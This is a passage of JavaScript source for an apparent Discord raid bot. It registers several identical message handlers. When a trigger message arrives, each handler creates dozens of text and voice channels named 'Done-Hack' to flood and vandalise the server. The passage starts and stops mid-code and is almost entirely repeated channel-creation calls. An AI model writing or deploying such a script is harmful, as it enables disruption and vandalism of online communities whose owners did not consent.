  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
